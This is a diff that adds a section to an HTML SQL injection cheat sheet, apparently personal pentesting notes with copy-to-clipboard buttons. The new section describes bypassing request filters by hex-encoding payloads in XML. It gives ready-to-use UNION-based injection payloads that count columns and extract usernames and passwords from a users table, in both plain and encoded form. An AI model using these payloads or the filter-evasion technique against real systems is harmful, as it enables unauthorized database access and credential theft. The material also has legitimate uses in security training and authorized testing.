@@ -182,6 +182,33 @@ from other tables.
 ... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT03')">.C3.</button></p>
+
+:::: FILTER BYPASS VIA XML ENCODING
+
+<b>NOTE: </b> 
+-First thing to check, headers to see if exist some XML code that is related to the behavior of the request. 
+-If yes, try changing values to see how it behaves.
+-Try different mathematical expressions to check if input is evaluated.
+
+<b><u>SAMPLE: </u></b> 1+1
+
+-If expressions are evaluated, it means that possible the vulnerability is present. Try injecting payloads and check results. 
+
+<b>NOTE: </b> If you get some responses that the request has been blocked, try encoding the payload information. [extension: hackvertor]
+
+<b>1. CHECK COLUMNS</b>
+
+<mark id="BXML01">1 UNION SELECT NULL</mark>
+
+<b>NOTE: </b> If you found only one column, you need to concatenate. <mark id="BXML02">|| '~' ||</mark> 
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BXML01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BXML02')">.C2.</button>
+
+2. RETRIEVE CONTENT
+
+<b>SAMPLE: </b> 1 UNION SELECT username || '~' || password FROM users
+
+<b>ENCODED SAMPLE: </b> &lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt@/hex_entities&gt;
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
